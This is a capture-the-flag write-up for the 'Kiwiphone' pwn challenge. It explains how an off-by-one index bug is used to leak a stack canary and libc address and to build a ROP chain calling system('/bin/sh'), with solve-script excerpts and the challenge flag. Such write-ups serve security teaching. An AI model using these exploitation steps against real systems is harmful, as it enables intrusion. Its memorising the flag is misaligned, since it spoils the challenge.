---
ctf: VUWCTF 2025
category: pwn
difficulty: medium
points: 400
flag: "VuwCTF{c0nv3nient1y_3vil_kiwi_nuMb3r_f0rMatt1nG}"
techniques: [off-by-one, stack_corruption, rop, stack_leak]
tools: [pwntools]
---

# Kiwiphone

## Description
An off-by-one index error in a phonebook application allows stack corruption and ROP chain execution.

## Vulnerability

Off-by-one index error in `kiwiphone.c:109`:

When the user enters index 0, the program writes to `entries[-1]`, which overlaps with the `phonebook.size` field.

## Solution

### Exploitation Steps

1. **Corrupt size**: Write to index 0 with `+48 0 0-0` to set `phonebook.size = 48`
2. **Leak stack data**: The program now prints 48 entries, leaking stack canary, saved RBP, and return address (libc)
3. **Calculate libc base**: `libc_base = ret_addr - 0x2a1ca`
4. **Write ROP chain**: Overwrite entries 17-22 with:
   ```
   [canary] [saved_rbp] [ret] [pop_rdi] [/bin/sh] [system]
   ```
5. **Trigger**: Exit with -1 to return through our ROP chain

### Key Parts of Solve Script

```python
# Corrupt size
write_entry(0, 48, 0, 0, 0)

# Leak and parse entries[16-18]
canary = entry_to_val(entries[16])
ret_addr = entry_to_val(entries[18])
libc.address = ret_addr - 0x2a1ca

# Write ROP chain
write_entry(17, *val_to_phone(canary))
write_entry(18, *val_to_phone(saved_rbp))
write_entry(19, *val_to_phone(ret_gadget))
write_entry(20, *val_to_phone(pop_rdi))
write_entry(21, *val_to_phone(bin_sh))
write_entry(22, *val_to_phone(system))

# Trigger
p.sendline(b'-1')
```

## Key Techniques
- Off-by-one index error exploitation
- Stack canary leak
- Libc address leak via return address
- ROP chain with `system("/bin/sh")`
- Stack structure analysis
